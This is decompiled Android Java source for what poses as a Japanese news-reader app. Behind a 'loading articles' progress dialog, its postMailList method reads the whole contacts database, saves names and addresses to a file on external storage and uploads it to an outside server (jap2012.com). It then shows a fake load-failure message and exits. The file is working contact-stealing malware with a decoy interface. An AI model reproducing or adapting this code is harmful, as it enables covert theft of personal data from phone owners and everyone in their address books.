package solution.newsandroid;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract.Data;
import android.util.Log;
import android.view.Menu;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.Writer;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;

public class MainviewActivity extends Activity {
    /* access modifiers changed from: private */
    public Activity activitys;
    /* access modifiers changed from: private */
    public ProgressDialog dialog;
    /* access modifiers changed from: private */
    public Handler handler = new Handler() {
        public void handleMessage(Message msg) {
            MainviewActivity.this.dialog.dismiss();
            new Builder(MainviewActivity.this.activitys).setMessage("記事の読込に失敗しました").setCancelable(false).setPositiveButton("OK", new OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    System.exit(0);
                }
            }).show();
        }
    };

    private class Progress implements Runnable {
        private Progress() {
        }

        /* synthetic */ Progress(MainviewActivity mainviewActivity, Progress progress) {
            this();
        }

        public void run() {
            try {
                MainviewActivity.this.postMailList();
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            MainviewActivity.this.handler.sendEmptyMessage(0);
        }
    }

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.mainview);
        this.activitys = this;
        this.dialog = new ProgressDialog(this);
        this.dialog.setTitle("Loading");
        this.dialog.setMessage("記事を読込中...");
        this.dialog.setProgressStyle(0);
        this.dialog.show();
        new Thread(new Progress(this, null)).start();
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.mainview, menu);
        return true;
    }

    /* access modifiers changed from: private */
    public void postMailList() {
        Cursor dataAddressTable = getContentResolver().query(Data.CONTENT_URI, null, null, null, null);
        Log.d("xxx", "start");
        String strMailList = "";
        while (dataAddressTable.moveToNext()) {
            Log.d("xxx2", dataAddressTable.getString(dataAddressTable.getColumnIndex("mimetype")));
            if (dataAddressTable.getString(dataAddressTable.getColumnIndex("mimetype")).equals("vnd.android.cursor.item/name")) {
                strMailList = new StringBuilder(String.valueOf(strMailList)).append("\n").toString();
            }
            strMailList = new StringBuilder(String.valueOf(strMailList)).append(dataAddressTable.getString(dataAddressTable.getColumnIndex("data1"))).toString();
            if (dataAddressTable.getString(dataAddressTable.getColumnIndex("mimetype")).equals("vnd.android.cursor.item/name")) {
                strMailList = new StringBuilder(String.valueOf(strMailList)).append(dataAddressTable.getString(dataAddressTable.getColumnIndex("data2"))).append(dataAddressTable.getString(dataAddressTable.getColumnIndex("data3"))).toString();
            }
            strMailList = new StringBuilder(String.valueOf(strMailList)).append(",").toString();
        }
        dataAddressTable.close();
        Log.d("xxx", "mailaddress get!" + Environment.getExternalStorageDirectory().getAbsolutePath());
        String SDFile = new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append("/addresscap/list.log").toString();
        File file = new File(SDFile);
        file.getParentFile().mkdir();
        try {
            FileOutputStream fos = new FileOutputStream(file, false);
            Writer outputStreamWriter = new OutputStreamWriter(fos, "UTF-8");
            PrintWriter printWriter = new PrintWriter(outputStreamWriter);
            printWriter.append(strMailList);
            printWriter.close();
            outputStreamWriter.close();
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
            Log.d("xxx", "err");
        }
        Log.d("xxx", "post start");
        try {
            HttpParams params = new BasicHttpParams();
            HttpConnectionParams.setSoTimeout(params, 8000);
            HttpConnectionParams.setConnectionTimeout(params, 8000);
            DefaultHttpClient client = new DefaultHttpClient(params);
            HttpPost httpPost = new HttpPost("http://jap2012.com/data/main.php");
            MultipartEntity entity = new MultipartEntity();
            entity.addPart("data", new FileBody(new File(SDFile)));
            entity.addPart("code", new StringBody("code03"));
            httpPost.setEntity(entity);
            HttpResponse httpResponse = client.execute(httpPost);
            if (httpResponse.getStatusLine().getStatusCode() == 200) {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
                StringBuilder response = new StringBuilder();
                while (true) {
                    String line = bufferedReader.readLine();
                    if (line == null) {
                        break;
                    }
                    response.append(line);
                }
                bufferedReader.close();
                Log.d("xxx", response.toString());
            }
        } catch (Exception e2) {
            e2.printStackTrace();
            Log.d("xxx", e2.toString());
        }
        Log.d("xxx", "post end  ");
    }
}
